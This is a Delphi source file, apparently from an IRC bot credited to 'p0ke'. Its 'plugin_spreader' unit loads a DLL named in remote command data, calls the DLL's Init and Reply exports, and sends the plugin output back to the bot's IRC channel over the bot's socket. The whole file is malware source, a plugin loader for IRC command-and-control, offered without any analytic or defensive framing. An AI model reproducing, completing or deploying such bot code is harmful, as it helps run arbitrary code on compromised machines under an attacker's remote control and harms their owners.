(* Created by p0ke, thanks to satan_addict *)
unit plugin_spreader;

interface

uses
  Windows;

type
  TPlugin       = Class
    Name        :String;
    Address     :Integer;
    Call        :Pointer;
  End;

  TPData = Record
    DLLName     :String;
    Data        :String;
  End;
  PPData = ^TPData;

  PlugIn     = Procedure(Owner: Integer);
  PluginInit = Procedure(PluginReply: Pointer; Data: PChar);

Var
  PData       :TPData;

  Procedure LoadPlugin(P: Pointer); STDCALL;

implementation

Uses
  untBot;

Procedure Reply(Text: pChar);STDCALL;
Begin
  If (Copy(Text, 1, 7) = 'PRIVMSG') Then
    BOT.SendData(Text+#10, FALSE, BOT.IRC.Sock)
  Else
    BOT.SendData('PRIVMSG '+BOT.Channel+' :'+Text+#10, FALSE, BOT.IRC.Sock);
End;

Procedure LoadPlugin(P: Pointer); STDCALL;
Var
  Plug :TPlugin;
Begin
  Plug := TPlugin.Create;
  Plug.Address := LoadLibrary(pChar(PPData(P)^.DLLName));
  Plugin(GetProcAddress(Plug.Address, 'Init'))(hInstance);
  PluginInit(GetProcAddress(Plug.Address, 'Reply'))(@Reply, pChar(PPData(P)^.Data));
End;

end.
